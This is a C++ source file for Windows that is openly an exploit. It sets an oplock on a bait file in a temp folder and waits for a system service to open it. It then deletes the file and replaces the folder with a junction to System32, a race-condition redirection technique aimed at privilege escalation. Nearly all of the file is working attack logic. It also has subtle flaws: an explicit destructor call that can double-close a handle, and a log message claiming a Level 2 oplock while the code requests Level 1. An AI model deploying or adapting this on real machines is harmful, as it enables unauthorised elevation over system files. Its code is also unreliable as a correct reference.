#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <cfapi.h>
#include <winioctl.h>
#include <iostream>
#include <string>
#include <memory>

#pragma comment(lib, "synchronization.lib")
#pragma comment(lib, "CldApi.lib")

// --- RAII Safety ---
class SmartHandle {
    HANDLE h_;
public:
    explicit SmartHandle(HANDLE h = INVALID_HANDLE_VALUE) : h_(h) {}
    ~SmartHandle() { if (h_ != INVALID_HANDLE_VALUE && h_ != NULL) CloseHandle(h_); }
    HANDLE get() const { return h_; }
    HANDLE* ptr() { return &h_; }
    bool isValid() const { return h_ != INVALID_HANDLE_VALUE && h_ != NULL; }
};

// --- The Pivot Engine ---
bool CreateJunction(const std::wstring& dir, const std::wstring& target) {
    SmartHandle hDir(CreateFileW(dir.c_str(), GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
        FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, NULL));

    if (!hDir.isValid()) return false;

    std::wstring ntTarget = L"\\??\\" + target;
    DWORD targetByteLen = (DWORD)(ntTarget.length() * sizeof(wchar_t));
    DWORD bufSize = FIELD_OFFSET(REPARSE_DATA_BUFFER, MountPointReparseBuffer.PathBuffer) + targetByteLen + 4;

    auto buffer = std::make_unique<BYTE[]>(bufSize);
    PREPARSE_DATA_BUFFER rdb = reinterpret_cast<PREPARSE_DATA_BUFFER>(buffer.get());

    rdb->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    rdb->ReparseDataLength = (USHORT)(targetByteLen + 8 + 4);
    rdb->MountPointReparseBuffer.SubstituteNameLength = (USHORT)targetByteLen;
    rdb->MountPointReparseBuffer.PrintNameOffset = (USHORT)(targetByteLen + 2);

    memcpy(rdb->MountPointReparseBuffer.PathBuffer, ntTarget.c_str(), targetByteLen);
    DWORD bytesReturned;
    return DeviceIoControl(hDir.get(), FSCTL_SET_REPARSE_POINT, rdb, bufSize, NULL, 0, &bytesReturned, NULL);
}

void FullRedLaunch() {
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hOut, FOREGROUND_RED | FOREGROUND_INTENSITY);
    std::wcout << L"[!] FULL RED ACTIVATED - OPLOCK ENGINE ONLINE" << std::endl;

    // 1. Setup Workspace
    wchar_t tmp[MAX_PATH];
    GetTempPathW(MAX_PATH, tmp);
    std::wstring workDir = std::wstring(tmp) + L"Global_Exploit_Dir";
    CreateDirectoryW(workDir.c_str(), NULL);

    std::wstring baitFile = workDir + L"\\target_svc.dat";

    // 2. Open Bait with Oplock-compatible flags
    // We need FILE_FLAG_OVERLAPPED to catch the break
    SmartHandle hBait(CreateFileW(baitFile.c_str(), GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL, CREATE_ALWAYS, FILE_FLAG_OVERLAPPED, NULL));

    if (!hBait.isValid()) {
        std::wcout << L"[-] Failed to seat bait." << std::endl;
        return;
    }

    // 3. Set the Trap (Oplock)
    OVERLAPPED ov = { 0 };
    ov.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);

    std::wcout << L"[*] Arming Level 2 Oplock on: " << baitFile << std::endl;

    // This call returns immediately, but the event triggers when someone else opens the file
    BOOL status = DeviceIoControl(hBait.get(), FSCTL_REQUEST_OPLOCK_LEVEL_1,
                                  NULL, 0, NULL, 0, NULL, &ov);

    std::wcout << L"[*] Trap set. Waiting for System process to trigger..." << std::endl;

    // 4. THE WAIT
    // At this point, the program sits here.
    // If a system service (like Indexer) tries to read this file, it HANGS.
    WaitForSingleObject(ov.hEvent, INFINITE);

    // 5. THE SWAP (THE RACE WIN)
    std::wcout << L"[!] OPLOCK BROKEN! System is waiting. Performing Pivot..." << std::endl;

    // Close the handle to the file so we can delete the directory/file
    hBait.~SmartHandle();
    DeleteFileW(baitFile.c_str());

    // Redirect the entire directory to System32
    if (CreateJunction(workDir, L"C:\\Windows\\System32")) {
        std::wcout << L"[+++] PIVOT SUCCESSFUL. Workspace now points to System32." << std::endl;
        std::wcout << L"[!] The calling service will now continue into the redirected path." << std::endl;
    } else {
        std::wcout << L"[-] Pivot failed at the finish line." << std::endl;
    }

    CloseHandle(ov.hEvent);
}

int main() {
    FullRedLaunch();
    system("pause");
    return 0;
}
